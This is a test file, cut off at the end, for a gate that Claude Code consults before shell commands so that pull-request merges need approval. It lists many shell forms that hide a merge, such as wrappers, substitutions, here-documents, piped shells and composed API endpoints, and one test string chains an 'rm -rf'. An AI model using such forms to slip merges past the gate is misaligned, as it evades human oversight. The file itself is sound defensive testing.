// The merge gate (CLAUDE.md, Working rules; scripts/merge-gate.mjs): Claude Code asks it before every shell command.
// It may answer "allow", which covers the whole command line, so the forms it must not allow are pinned here beside
// the ones it must ask about; and it sees every command, so the lines that only mention a merge are pinned too. The
// review of #635 walked past the first version with a flag before the subcommand, a `cd`, a substitution inside
// quotes and a request body in a file: each is a case here, so the next rewrite cannot lose one.
import { execFileSync } from 'node:child_process'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { describe, expect, it } from 'vitest'
// @ts-expect-error — a plain node script, deliberately dependency-free and untyped
import { decide, mergesIn, repositoryOf, simpleCommands, withinBudget } from '../../scripts/merge-gate.mjs'

type Merge = { ref: string | null; repo: string | null; dirs: string[]; unreadable: boolean; plain: boolean; files?: string[] }
type Command = { words: string[]; dynamic: boolean[]; scripts: string[]; bodies: string[]; before: string; after: string }
type Answer = { decision: 'ask' | 'allow'; reason: string } | null

const HERE = 'srjoeee/readarxiv'
/** Pull requests by number: this repository's unless the merge names another */
const BASES: Record<string, string> = { '603': 'next', '411': 'main', '77': 'main' }
/** The branch's own pull request, by the directory the merge runs in */
const BRANCHES: Record<string, { number: number; base: string }> = { '': { number: 600, base: 'next' }, '../release': { number: 411, base: 'main' }, '../feature': { number: 603, base: 'next' } }
const lookup = (merge: Merge) => {
  if (merge.ref === null) {
    const found = BRANCHES[merge.dirs.join('|')]
    return found === undefined ? null : { repo: 'SRjoeee/ReadarXiv', ...found }
  }
  const number = merge.ref.replace(/^.*\/pull\//, '')
  const base = BASES[number]
  return base === undefined ? null : { repo: merge.repo ?? 'SRjoeee/ReadarXiv', base, number: Number(number) }
}
const FILES: Record<string, string> = {
  'merge.json': '{"query":"mutation { mergePullRequest(input: {pullRequestId: \\"x\\"}) { clientMutationId } }"}',
  'threads.graphql': 'query { viewer { login } }',
}
const read = (file: string) => FILES[file] ?? null
const answer = (text: string, here: string | null = HERE) => decide(text, { lookup, read, here }) as Answer
const merges = (text: string) => mergesIn(text) as Merge[]
const commandsOf = (text: string) => simpleCommands(text).commands as Command[]
/** The one merge a command line makes */
const merge = (text: string): Merge => {
  const [only] = merges(text)
  if (only === undefined) throw new Error(`no merge in: ${text}`)
  return only
}

describe('simpleCommands', () => {
  it('splits at every operator, keeps a quoted operator inside its word, and says what joins two commands', () => {
    const commands = commandsOf(`git status && echo "a; b" | cat`)
    expect(commands.map(c => c.words)).toEqual([['git', 'status'], ['echo', 'a; b'], ['cat']])
    expect(commands.map(c => [c.before, c.after])).toEqual([['', '&&'], ['&&', '|'], ['|', '']])
    expect(simpleCommands(`git status && echo "a; b" | cat`).compound).toBe(true)
  })

  it('leaves one dynamic word where a substitution stands, and hands its text over as a script', () => {
    const { commands, compound } = simpleCommands('gh pr merge $(cat n) --merge')
    expect(commands).toHaveLength(1)
    expect(commands[0]).toMatchObject({ words: ['gh', 'pr', 'merge', '$(…)', '--merge'], dynamic: [false, false, false, true, false], scripts: ['cat n'] })
    expect(compound).toBe(true)
    expect(commandsOf('echo "a $(gh pr merge 5) b" `date`')[0]?.scripts).toEqual(['gh pr merge 5', 'date'])
    expect(commandsOf(`echo '$x' "$x"`)[0]?.dynamic).toEqual([false, false, true])
    // inside double quotes a backslash quotes only what the shell says it does, and with a newline it is a line
    // continuation that leaves nothing (#635, Codex)
    expect(commandsOf('echo "a\\\nb" "c\\nd" "\\$x" "q\\"q"')[0]).toMatchObject({ words: ['echo', 'ab', 'c\\nd', '$x', 'q"q'], dynamic: [false, false, false, false, false] })
    // a process substitution is a word the shell decides, and a script (#635, Codex)
    expect(commandsOf('diff <(gh pr merge 5) >(cat) file')[0]).toMatchObject({ words: ['diff', '$(…)', '$(…)', 'file'], dynamic: [false, true, true, false], scripts: ['gh pr merge 5', 'cat'] })
  })

  it('drops a redirection with its target, a comment, and the body of a here-document', () => {
    expect(simpleCommands('gh pr merge 5 > out 2>&1')).toMatchObject({ redirected: true, commands: [{ words: ['gh', 'pr', 'merge', '5'] }] })
    expect(commandsOf('ls # gh pr merge 5').map(c => c.words)).toEqual([['ls']])
    const quoted = commandsOf("cat > note <<'EOF'\nrun `gh pr merge 5` (then\nEOF\nls")
    expect(quoted.map(c => c.words)).toEqual([['cat'], ['ls']])
    expect(quoted[0]?.scripts).toEqual([])
    // an unquoted delimiter: the shell runs what the body substitutes
    expect(commandsOf('cat <<EOF\nrun `gh pr merge 5` then\nEOF')[0]?.scripts).toEqual(['gh pr merge 5'])
  })
})

describe('mergesIn', () => {
  it('reads the pull request and the repository past every flag that takes a value', () => {
    expect(merges('gh pr merge 603 --merge')).toEqual([{ ref: '603', repo: null, dirs: [], unreadable: false, plain: true }])
    expect(merge(`gh pr merge --subject "merge 411 now" -b 'body 411' 603 -m`).ref).toBe('603')
    expect(merge('gh pr merge -R SRjoeee/readarxiv-web 77 --merge')).toMatchObject({ ref: '77', repo: 'SRjoeee/readarxiv-web' })
    expect(merge('gh pr merge --repo=o/r 77').repo).toBe('o/r')
    expect(merge('gh pr merge -mdRo/r 77')).toMatchObject({ ref: '77', repo: 'o/r' })
    expect(merge('gh pr merge https://github.com/SRjoeee/ReadarXiv/pull/411').ref).toBe('https://github.com/SRjoeee/ReadarXiv/pull/411')
    expect(merge('gh pr merge --merge')).toMatchObject({ ref: null, plain: true })
  })

  it('reads a flag that stands before the subcommand (#635, Codex)', () => {
    expect(merge('gh -R SRjoeee/ReadarXiv pr merge 411 --merge')).toMatchObject({ ref: '411', repo: 'SRjoeee/ReadarXiv', unreadable: false })
    expect(merge('gh pr -R o/r merge 77')).toMatchObject({ ref: '77', repo: 'o/r' })
    expect(merge('gh --repo=o/r pr merge 77')).toMatchObject({ ref: '77', repo: 'o/r' })
    expect(merge('gh -R $REPO pr merge 77').unreadable).toBe(true)
  })

  it('finds a merge behind a wrapper, an assignment, a path and an operator, and calls none of them plain', () => {
    for (const text of [
      'cd wt && gh pr merge 603 --merge',
      'gh pr merge 603 --merge && git pull',
      'gh pr merge 603 --merge; rm -rf x',
      'env gh pr merge 603',
      'xargs gh pr merge',
      'FOO=1 gh pr merge 603',
      'gh pr merge 603 > log',
      'echo $(gh pr merge 603)',
      'gh pr merge 603 --body "$NOTE"',
      '{ gh pr merge 603; }',
    ]) {
      expect(merges(text), text).toHaveLength(1)
      expect(merge(text).plain, text).toBe(false)
    }
    expect(merge('/opt/homebrew/bin/gh pr merge 603')).toMatchObject({ ref: '603', plain: true })
  })

  it('finds a merge inside a quoted substitution and inside a string a shell is handed (#635, Codex and Devin)', () => {
    expect(merges('gh pr merge 603 --body "$(gh pr merge 411 --merge)"').map(m => m.ref)).toEqual(['603', '411'])
    expect(merge('echo "`gh pr merge 411`"').ref).toBe('411')
    expect(merge('bash -c "gh pr merge 411 --merge"')).toMatchObject({ ref: '411', plain: false })
    expect(merge(`zsh -lc 'cd ../release && gh pr merge --merge'`)).toMatchObject({ ref: null, dirs: ['../release'] })
    expect(merge('eval "gh pr merge 411 --merge"').ref).toBe('411')
    expect(merge('cat <<EOF\n$(gh pr merge 411)\nEOF').ref).toBe('411')
    // a shell given no string runs its here-document, quoted or not
    expect(merge("bash <<'EOF'\ngh pr merge 411 --merge\nEOF")).toMatchObject({ ref: '411', plain: false })
    expect(merge('sh -s <<EOF\ncd ../release && gh pr merge\nEOF')).toMatchObject({ ref: null, dirs: ['../release'] })
    // a shell's options as the shell reads them: `c` anywhere in a cluster, an option that takes a word, a long one
    // (#635, Codex: `bash -ce`); the string is the first word that is no option
    for (const text of [
      `bash -ce 'gh pr merge 411 --merge'`,
      `bash -euxo pipefail -c 'gh pr merge 411'`,
      `bash -c -e 'gh pr merge 411'`,
      `zsh -o errexit -c 'gh pr merge 411'`,
      `bash --norc -ec 'gh pr merge 411' arg0`,
      `bash -c -- 'gh pr merge 411'`,
      "bash -s -- one <<'EOF'\ngh pr merge 411\nEOF",
      "bash -e <<'EOF'\ngh pr merge 411\nEOF",
    ]) {
      expect(merges(text).map(m => m.ref), text).toEqual(['411'])
    }
    expect(merge('bash -c "gh pr mer\\\nge 411 \\\n  --merge"')).toMatchObject({ ref: '411', unreadable: false })
    // the other ways a line hands a shell its commands on the standard input: a here-string (#635, Codex), a pipe
    for (const text of [
      `bash <<< 'gh pr merge 411 --merge'`,
      `sh -e <<<"gh pr merge 411"`,
      `echo 'gh pr merge 411 --merge' | bash`,
      `printf '%s\\n' 'gh pr merge 411' | tee log | sh -s`,
      "cat <<'EOF' | bash\ngh pr merge 411\nEOF",
    ]) {
      expect(merges(text).map(m => m.ref), text).toEqual(['411'])
    }
    // a here-document's body is its opener's, whatever the line goes on to before the body starts (#635, Codex)
    for (const text of [
      "bash <<'EOF' | cat\ngh pr merge 411 --merge\nEOF",
      "bash <<'EOF' && echo done\ngh pr merge 411\nEOF",
      "cat <<A; sh <<'B'\nnothing here\nA\ngh pr merge 411\nB",
      "bash <<EOF 2>&1 | tee log\ngh pr merge 411\nEOF",
    ]) {
      expect(merges(text).map(m => m.ref), text).toEqual(['411'])
    }
    expect(merges("cat <<'EOF' | cat; bash -c true\ngh pr merge 411\nEOF")).toEqual([])
    expect(commandsOf("cat <<A | tr a b; bash <<'B'\nfirst\nA\nsecond\nB").map(c => c.bodies)).toEqual([['first\n'], [], ['second\n']])
    // (a here-string is data to anything that is no shell)
    expect(merges(`cat <<< 'gh pr merge 411'`)).toEqual([])
    expect(merges(`echo 'gh pr merge 411' | cat`)).toEqual([])
    // a shell given a script file runs the file, which is not the line's to read; its here-document is the file's input
    expect(merges("bash release.sh <<'EOF'\ngh pr merge 411\nEOF")).toEqual([])
    // (words handed to a program are not its script, but a wrapper may run them: read as a merge behind one, and asked about)
    expect(merge('bash -e release.sh gh pr merge 411')).toMatchObject({ ref: '411', unreadable: true })
    expect(merges('bash -e release.sh 411')).toEqual([])
  })

  it('follows a literal cd to the directory a merge runs in, and calls unreadable a merge whose directory or branch it lost (#635, Codex)', () => {
    expect(merge('cd ../release && gh pr merge --merge')).toMatchObject({ ref: null, dirs: ['../release'], unreadable: false })
    expect(merge('cd /a\ncd b; gh pr merge 603')).toMatchObject({ dirs: ['/a', 'b'], unreadable: false })
    expect(merge('git fetch && gh pr merge 603 --merge').unreadable).toBe(false)
    expect(merge('pushd x && gh pr merge 603 -R SRjoeee/ReadarXiv').unreadable).toBe(false)
    expect(merge('cd x && gh pr merge https://github.com/SRjoeee/ReadarXiv/pull/603').unreadable).toBe(false)
    expect(merge('git fetch && cd wt && gh pr merge 603')).toMatchObject({ dirs: ['wt'], unreadable: false })
    expect(merge('git fetch && cd wt && bash -c "gh pr merge 603"')).toMatchObject({ dirs: ['wt'], unreadable: false })
    // what a subshell does to the directory and the variables ends with it (#635, Codex); the branch it leaves is left
    expect(merge('(true; cd ../other; true); gh pr merge 411 --merge')).toMatchObject({ ref: '411', dirs: [], unreadable: false })
    expect(merge('(cd x && gh pr merge 603)')).toMatchObject({ dirs: ['x'], unreadable: false })
    expect(merges('(cd x && gh pr merge 603); (cd y; gh pr merge 411) && gh pr merge 5 -R o/r').map(m => [m.ref, m.dirs])).toEqual([['603', ['x']], ['411', ['y']], ['5', []]])
    expect(merge('cd a && (cd b); gh pr merge 603')).toMatchObject({ dirs: ['a'], unreadable: false })
    for (const text of ['(n=411); gh pr merge $n', '(git checkout other); gh pr merge', 'cd y); gh pr merge 5']) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
    // a `case` closes each pattern with a `)` that ends no subshell: the polling loops of these sessions keep their
    // directory through it, and a subshell around or inside a `case` still ends where it ends
    expect(merge('cd /w && for i in 1 2 3; do s=$(gh pr view 5 --json mergeable -q .mergeable); case "$s" in MERGEABLE*) break;; UNKNOWN|"") sleep 3;; esac; done; gh pr merge 5 --merge')).toMatchObject({ dirs: ['/w'], unreadable: false })
    expect(merge('( case $x in a) true;; esac; cd y ); gh pr merge 5')).toMatchObject({ dirs: [], unreadable: false })
    expect(merge('case $x in (a) (cd y; true);; esac; gh pr merge 5')).toMatchObject({ dirs: [], unreadable: false })
    // inside a block a command runs or not as the block decides: its `cd`, its assignment, are not counted on
    for (const text of [
      'case $x in a) cd y;; esac; gh pr merge 5',
      'if true; then\n  cd y\nfi\ngh pr merge 5',
      'if cd y; then true; fi; gh pr merge 5',
      'while true; do\n  cd y\n  break\ndone; gh pr merge 5',
      'case $x in a) n=411;; esac; gh pr merge $n',
      'if true; then\n  n=411\nfi\ngh pr merge $n',
    ]) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
    expect(merge('if [ "$c" = SUCCESS ]; then gh pr merge 332 --merge 2>&1 | tail -1; fi')).toMatchObject({ ref: '332', unreadable: false })
    // a substitution runs before the command it stands in (#635, Codex): what that command leans on may be another by then
    for (const text of [
      'gh pr merge --body "$(git checkout -q release)" --merge',
      'gh pr merge --merge --body "$(cat note)"',
      'gh api graphql --input request.json --header "$(cp mutation.json request.json)"',
    ]) {
      expect(merges(text)[0]?.unreadable, text).toBe(true)
    }
    // (a merge that names its pull request leans on neither the branch nor a file)
    expect(merge('gh pr merge 603 --merge --body "$(cat note)"')).toMatchObject({ ref: '603', unreadable: false, plain: false })
    // an assignment reached through `&&` ends with its chain; the plain `cd` before it does not
    expect(merge('cd /w && R=repos/o/r && gh api $R/comments | cat; gh pr merge 603')).toMatchObject({ dirs: ['/w'], unreadable: false })
    for (const text of [
      'git checkout release && gh pr merge --merge',
      'gh pr checkout 411 && gh pr merge',
      'pushd x && gh pr merge 603',
      'cd "$DIR" && gh pr merge 603',
      'cd x || true; gh pr merge 603',
      'test -d wt && cd wt; gh pr merge 603',
      'cd - && gh pr merge 603',
      'if true; then cd x; fi; gh pr merge 603',
      'export GH_REPO=o/r; gh pr merge 603',
      'source env.sh && gh pr merge 603',
      'gh api -X PUT repos/{owner}/{repo}/pulls/603/merge; cd x; eval "$Y"; gh api -X PUT repos/{owner}/{repo}/pulls/411/merge',
    ]) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
  })

  it('reads a variable the line itself set to literals: the merges of a loop, a repository held in a name', () => {
    // the forms the sessions of this repository merge in (replayed from their transcripts, #635)
    expect(merges('for n in 603 411; do gh pr merge $n -R SRjoeee/ReadarXiv --merge 2>&1 | tail -1; done')).toEqual([
      { ref: '603', repo: 'SRjoeee/ReadarXiv', dirs: [], unreadable: false, plain: false },
      { ref: '411', repo: 'SRjoeee/ReadarXiv', dirs: [], unreadable: false, plain: false },
    ])
    expect(merge('R=SRjoeee/readarxiv-web; gh pr merge 77 --repo $R --merge')).toMatchObject({ ref: '77', repo: 'SRjoeee/readarxiv-web', unreadable: false })
    // biome-ignore lint/suspicious/noTemplateCurlyInString: a shell expansion, not a template
    expect(merges('cd /w && for n in 603 411; do gh pr merge "${n}" --merge && echo m$n; sleep 6; done').map(m => [m.ref, m.dirs, m.unreadable])).toEqual([['603', ['/w'], false], ['411', ['/w'], false]])
    for (const text of [
      'for n in $(seq 1 3); do gh pr merge $n; done',
      'n=$(cat number); gh pr merge $n',
      'read n; gh pr merge $n',
      'n=603; read n; gh pr merge $n',
      'test -f pick && n=411; gh pr merge $n',
      'for n in 603 411; do gh pr merge "#$n"; done',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: a shell expansion, not a template
      'for n in 603 411; do gh pr merge ${n:-5}; done',
      // a name every object answers to is still a variable nobody set
      'for n in 603; do gh pr merge $constructor; done',
      'gh pr merge $toString -R $__proto__',
    ]) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
  })

  it('takes a variable at its value only when the line sets it once and in sight (#635, Codex: a value set again in a branch)', () => {
    for (const text of [
      'N=603; if true; then N=411; fi; gh pr merge "$N" --merge',
      'n=603; while sleep 1; do gh pr merge $n; n=411; done',
      'n=603; n+=1; gh pr merge $n',
      'n=603; export n=411; gh pr merge $n',
      'n=603; f() { n=411; }; f; gh pr merge $n',
      'n=603; read n < number; gh pr merge $n',
      'n=603; unset n; gh pr merge $n',
      'n=603; eval "$X"; gh pr merge $n',
      'n=603; source ./pick.sh; gh pr merge $n',
      'n=603; : $((n=411)); gh pr merge $n',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: a shell expansion, not a template
      'n=603; : ${n:=411}; gh pr merge $n',
      'n=603; printf -v n 411; gh pr merge $n',
      // the review's second form of the same, and the reason the rule is no longer a list of commands that assign:
      // a variable is trusted only on a line whose every command is known not to assign one
      "n=603; printf -vn '%s' 411; gh pr merge $n",
      'n=603; print -v n 411; gh pr merge $n',
      'n=603; read -an <<< 411; gh pr merge $n',
      'n=603; some-tool --set n; gh pr merge $n',
      'n=603; $TOOL; gh pr merge $n',
      'n=603; command printf -vn 411; gh pr merge $n',
      'n=603; exec {n}>/dev/null; gh pr merge $n',
      'n=603; local n; gh pr merge $n',
      'n=603; export n; gh pr merge $n',
      'for n in 603; do n=411; gh pr merge $n; done',
      'for n in 603; do gh pr merge $n; n=411; done',
      'for n in 603; do read n; gh pr merge $n; done',
      'for n in 603; do for n in 411; do :; done; gh pr merge $n; done',
      // a script of its own does not take the line's variables
      'for n in 603 411; do echo "$(gh pr merge $n)"; done',
    ]) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
    expect(answer('N=603; if true; then N=411; fi; gh pr merge "$N" --merge')?.decision).toBe('ask')
    // inside the body of its own loop a variable is one of that loop's values, whatever else the line does with the name:
    // the check-then-merge pair of loops these sessions write, a loop inside a loop, a name used before
    const refs = (text: string) => merges(text).map(m => [m.ref, m.unreadable])
    expect(refs('for n in 603 411; do gh pr view $n; done; for n in 603 411; do gh pr merge $n --merge; done')).toEqual([['603', false], ['411', false]])
    expect(refs('for n in 603; do for n in 411; do gh pr merge $n; done; done')).toEqual([['411', false]])
    expect(refs('n=603; for n in 411; do gh pr merge $n; done')).toEqual([['411', false]])
    expect(refs('for n in 603 411; do :; done; gh pr merge $n')).toEqual([['603', false], ['411', false]])
    expect(refs('n=603; while sleep 9; do gh pr merge $n && break; done')).toEqual([['603', false]])
    expect(refs(`n=603; printf '%s\\n' merging; git fetch -q && gh pr merge $n --merge 2>&1 | tail -1; echo done`)).toEqual([['603', false]])
    expect(refs('export n=603; gh pr merge $n')).toEqual([['603', false]])
    expect(refs('set -e; set -o pipefail; for n in 603 411; do gh pr merge $n --merge || { echo stop; exit 1; }; done')).toEqual([['603', false], ['411', false]])
    expect(refs('n=603; set -A n 411; gh pr merge $n')).toEqual([['$n', true]])
    expect(refs('n=603; set -- 411; gh pr merge $n')).toEqual([['$n', true]])
  })

  it('calls unreadable a merge in a loop whose branch or directory the loop itself may change', () => {
    for (const text of [
      'while sleep 1; do gh pr merge --merge; git checkout other; done',
      'for b in a b; do git checkout $b; gh pr merge --merge; done',
      'while sleep 1; do gh pr merge 603; cd ../other; done',
      'for d in a b; do pushd $d; done; while true; do gh pr merge 603; done',
    ]) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
    expect(merge('cd /w && while sleep 9; do gh pr merge 603 --merge && break; done')).toMatchObject({ dirs: ['/w'], unreadable: false })
  })

  it('reads a merge behind a wrapper only when it names its repository and its pull request (#635, Codex: `env GH_REPO=…`)', () => {
    // what a wrapper does to the directory, the branch and the environment `gh` runs in is the wrapper's to know
    for (const text of [
      'env GH_REPO=SRjoeee/ReadarXiv gh pr merge 411 --merge',
      'env -i GH_HOST=example.com gh pr merge 5 -R o/r',
      'GIT_DIR=/other/.git gh pr merge 5',
      'export GIT_DIR=/other/.git; gh pr merge 5',
      'env gh pr merge 603',
      'env -C ../release gh pr merge',
      'xargs gh pr merge',
      'command gh pr merge',
      'nice gh api -X PUT repos/{owner}/{repo}/pulls/5/merge',
      // and a command before the merge that changes which repository a directory is
      'git remote set-url origin https://github.com/SRjoeee/ReadarXiv && gh pr merge 411',
      'git config remote.origin.url https://github.com/o/r; gh pr merge 5',
      'gh repo set-default o/r && gh pr merge 5',
    ]) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
    // the same behind a wrapper that hands a shell its string: the string runs where the wrapper put it (#635, Codex)
    for (const text of [`env -C ../release bash -c 'gh pr merge --merge'`, `env GH_REPO=o/r bash -c 'gh pr merge 5'`, "env -C ../release bash <<'EOF'\ngh pr merge 5\nEOF", `nice sh -c 'cd wt && gh pr merge'`]) {
      expect(merges(text).at(-1)?.unreadable, text).toBe(true)
    }
    expect(merge(`nice bash -c 'gh pr merge 603 -R o/r'`)).toMatchObject({ ref: '603', repo: 'o/r', unreadable: false })
    // and for the file a GraphQL request takes its body from: a relative path is read in a directory (#635, Codex)
    for (const text of ['env -C ../release gh api graphql --input request.json', 'pushd x; gh api graphql -F query=@q.graphql', 'cd "$DIR" && gh api graphql --input request.json']) {
      expect(merge(text), text).toMatchObject({ unreadable: true })
      expect(merge(text).files, text).toBeUndefined()
    }
    expect(merge('env -C ../release gh api graphql --input /abs/request.json')).toMatchObject({ files: ['/abs/request.json'], unreadable: false })
    expect(merge('cd ../release && gh api graphql --input request.json')).toMatchObject({ files: ['request.json'], dirs: ['../release'], unreadable: false })
    expect(merge(`bash -c 'gh pr merge 603'`).unreadable).toBe(false)
    expect(merge('command gh pr merge 603 -R o/r')).toMatchObject({ ref: '603', repo: 'o/r', unreadable: false, plain: false })
    expect(merge('env FOO=1 gh pr merge https://github.com/o/r/pull/5').unreadable).toBe(false)
    expect(merge('nice gh api -X PUT repos/o/r/pulls/5/merge').unreadable).toBe(false)
    expect(merge('git remote -v && gh pr merge 5 -R o/r').unreadable).toBe(false)
    // a word the shell reserves is no wrapper
    expect(merge('if true; then gh pr merge 603; fi').unreadable).toBe(false)
    expect(merge('time gh pr merge 603').unreadable).toBe(false)
  })

  it('calls unreadable a merge with a word the shell decides that is no option\'s value: it may be the flag that picks the repository (#635, Codex)', () => {
    for (const text of [
      'FLAGS=--repo=SRjoeee/ReadarXiv; gh pr merge 411 "$FLAGS" --merge',
      'gh pr merge 603 $EXTRA',
      'gh pr merge 603 --merge "$@"',
      'gh $OPTS pr merge 411',
      'gh pr $OPTS merge 411',
      'F=--admin; gh pr merge $F 603',
      'R=-R; gh pr merge 603 $R o/r',
    ]) {
      expect(merges(text).at(-1), text).toMatchObject({ unreadable: true })
    }
    // the value of an option that takes one is that option's, whatever the shell makes of it
    expect(merge('gh pr merge 603 --merge --subject "Merge #$n" --body "$(cat note)" --match-head-commit $H -t "$T"')).toMatchObject({ ref: '603', unreadable: false })
  })

  it('calls unreadable a merge whose pull request the shell decides', () => {
    for (const text of ['gh pr merge $N --merge', 'gh pr merge "$N"', 'gh pr merge $(cat n)', 'gh pr merge `cat n`', 'gh pr merge 603 -R $REPO', 'GH_REPO=o/r gh pr merge 603', 'bash -c "gh pr merge $N"', '$GH pr merge 411', '"$GH" pr merge 411']) {
      expect(merge(text).unreadable, text).toBe(true)
    }
    expect(merge('gh pr merge 603 --body "$NOTE"').unreadable).toBe(false)
  })

  it('reads the REST and the GraphQL way to merge, and no other request', () => {
    expect(merges('gh api -X PUT repos/SRjoeee/ReadarXiv/pulls/411/merge -f merge_method=merge')).toEqual([{ ref: '411', repo: 'SRjoeee/ReadarXiv', dirs: [], unreadable: false, plain: false }])
    expect(merge('gh api --method=put /repos/{owner}/{repo}/pulls/411/merge')).toMatchObject({ ref: '411', repo: null, unreadable: false })
    // a repository named by half: the other half is the directory's to fill, and the gate does not put the two together (#635, Codex)
    expect(merge('gh api -X PUT repos/{owner}/ReadarXiv/pulls/411/merge').unreadable).toBe(true)
    expect(merge('gh api -X PUT repos/SRjoeee/:repo/pulls/411/merge').unreadable).toBe(true)
    expect(merge('gh api -XPUT repos/o/r/pulls/$N/merge').unreadable).toBe(true)
    expect(merge(`gh api graphql -f query='mutation { mergePullRequest(input: {pullRequestId: "x"}) { clientMutationId } }'`).unreadable).toBe(true)
    expect(merges('gh api repos/SRjoeee/ReadarXiv/pulls/411/merge')).toEqual([])
    expect(merges('gh api repos/SRjoeee/ReadarXiv/pulls/411/comments -f body=x')).toEqual([])
    expect(merges('gh api -X PUT repos/SRjoeee/ReadarXiv/pulls/411/update-branch')).toEqual([])
    // every way `gh api` takes an option's value: a word of its own, attached, in a cluster of short flags
    expect(merge('gh api -iXPUT repos/o/r/pulls/5/merge')).toMatchObject({ ref: '5', repo: 'o/r' })
    expect(merge('gh api --method PUT -H "Accept: x" repos/o/r/pulls/5/merge').ref).toBe('5')
    expect(merge('gh api -X "$METHOD" repos/o/r/pulls/5/merge').ref).toBe('5')
    expect(merges('gh api -X POST repos/o/r/pulls/5/merge')).toEqual([])
    // the path is the endpoint, whatever query follows it (#635, Codex)
    expect(merge(`gh api -X PUT 'repos/SRjoeee/ReadarXiv/pulls/411/merge?sha=abc'`)).toMatchObject({ ref: '411', repo: 'SRjoeee/ReadarXiv', unreadable: false })
    expect(merge('gh api -X PUT "$R/merge?merge_method=merge"').unreadable).toBe(true)
    expect(merges(`gh api -X PUT 'repos/o/r/pulls/5/update-branch?x=/merge'`)).toEqual([])
    // an endpoint the shell composes (#635, Codex): a PUT to one that may end in `/merge` is a merge nobody can read
    for (const text of [
      'ENDPOINT=repos/SRjoeee/ReadarXiv/pulls/411/merge; gh api -X PUT "$ENDPOINT"',
      'R=repos/o/r/pulls/8; gh api -X PUT $R/merge',
      'gh api --method PUT "$(cat endpoint)" -f merge_method=merge',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: a shell expansion, not a template
      'gh api -X "$METHOD" "${BASE}/merge"',
    ]) {
      expect(merges(text).at(-1), text).toMatchObject({ unreadable: true, plain: false })
    }
    // a word beside the endpoint that the shell decides may be an option whole, `-X PUT` among them (#635, Codex)
    expect(merge('gh api "$EXTRA" repos/o/r/pulls/5/merge')).toMatchObject({ ref: '5', repo: 'o/r', unreadable: false })
    expect(merge('gh api $ENDPOINT $EXTRA').unreadable).toBe(true)
    // where the words say it is none: the path ends otherwise, the word is an option's value, the request is no PUT
    for (const text of [
      'gh api -X PUT "$BASE/pulls/$n/update-branch"',
      'gh api -X PUT repos/o/r/labels/bug -f name="$NAME" -H "X: $TOKEN"',
      'gh api "$ENDPOINT"',
      'gh api -X POST "$ENDPOINT"',
      'gh api repos/o/r/labels "$EXTRA"',
      // (a line of these sessions: the path is in sight, the shell decides only the query after it)
      'for since in 2026-10-01..2026-10-31; do gh api "/repos/o/r/actions/runs?created=$since&per_page=100" --jq "$FILTER" "$MORE"; done',
      'gh api $R/123/replies -f body="$NOTE"',
      'R=repos/o/r/pulls/8/comments && gh api $R/4179074820/replies -f body="checked $n"',
    ]) {
      expect(merges(text), text).toEqual([])
    }
  })

  it('names the files a GraphQL request takes its body from, and reads a body the command line itself holds (#635, Codex and Devin)', () => {
    expect(merge('gh api graphql --input merge.json')).toMatchObject({ files: ['merge.json'], unreadable: false })
    expect(merge('gh api graphql -F query=@q.graphql -F id=1').files).toEqual(['q.graphql'])
    // an option's value attached to its flag (#635, Codex)
    expect(merge(`gh api graphql -fquery='mutation { mergePullRequest(input: {}) { clientMutationId } }'`).unreadable).toBe(true)
    expect(merge('gh api graphql -Fquery=@q.graphql').files).toEqual(['q.graphql'])
    expect(merge('gh api graphql --field=query=@q.graphql --input=body.json').files).toEqual(['q.graphql', 'body.json'])
    expect(merges(`gh api graphql -fquery='query { viewer { login } }'`)).toEqual([])
    expect(merge(`Q='mutation { mergePullRequest(input: {}) { clientMutationId } }'; gh api graphql -f query="$Q"`).unreadable).toBe(true)
    expect(merge(`gh api graphql --input - <<'EOF'\n{"query":"mutation { mergePullRequest(input: {}) { clientMutationId } }"}\nEOF`).unreadable).toBe(true)
    expect(merges(`gh api graphql -f query='query($id: ID!) { node(id: $id) { id } }' -F id="$ID"`)).toEqual([])
    expect(merges('gh api graphql -f query=@literal')).toEqual([])
    // a query the line does not show, and a body file the line does not name, are a request nobody can read
    // the endpoint as the CLI takes it: bare, or the URL of one (#635, Codex); and a merge mutation in sight is one
    // whatever endpoint the shell composes for it
    expect(merge(`gh api https://api.github.com/graphql -f 'query=mutation { mergePullRequest(input: {}) { clientMutationId } }'`).unreadable).toBe(true)
    expect(merge('gh api https://ghe.example.com/api/graphql -F query=@q.graphql').files).toEqual(['q.graphql'])
    expect(merge(`gh api "$ENDPOINT" -f query='mutation { mergePullRequest(input: {}) { clientMutationId } }'`).unreadable).toBe(true)
    expect(merges(`gh api https://api.github.com/graphql -f query='query { viewer { login } }'`)).toEqual([])
    // an option the shell composes whole, beside the endpoint, may be the query (#635, Codex)
    expect(merges(`FIELD='-fquery=mutation { mergePullRequest(input: {}) { clientMutationId } }'; gh api graphql "$FIELD"`).at(-1)).toMatchObject({ unreadable: true })
    expect(merge('gh api graphql $ARGS').unreadable).toBe(true)
    // (a field the shell composes whole hides its key too: #635, Codex; one whose key is in sight and is not `query` hides nothing)
    expect(merges(`FIELD='query=mutation { mergePullRequest(input: {}) { clientMutationId } }'; gh api graphql -f "$FIELD"`).at(-1)).toMatchObject({ unreadable: true })
    expect(merge('gh api graphql --raw-field "$FIELD"').unreadable).toBe(true)
    expect(merges(`gh api graphql -f query='query { viewer { login } }' -F "n=$N" -f after="$CURSOR"`)).toEqual([])
    for (const text of ['gh api graphql -f query="$Q"', 'Q=$(cat merge.graphql); gh api graphql -f query="$Q"', 'gh api graphql --input "$FILE"', 'gh api graphql -F query=@$f', "gh api graphql --input - <<'EOF'\n{}\nEOF", 'gh api graphql --input <(cat mutation.json)']) {
      expect(merges(text).at(-1), text).toMatchObject({ unreadable: true })
    }
    // a body file is read before the line runs, so it is trusted only while nothing on the line could have rewritten
    // it first (#635, Codex: `cp mutation.json request.json && gh api graphql --input request.json`)
    for (const text of [
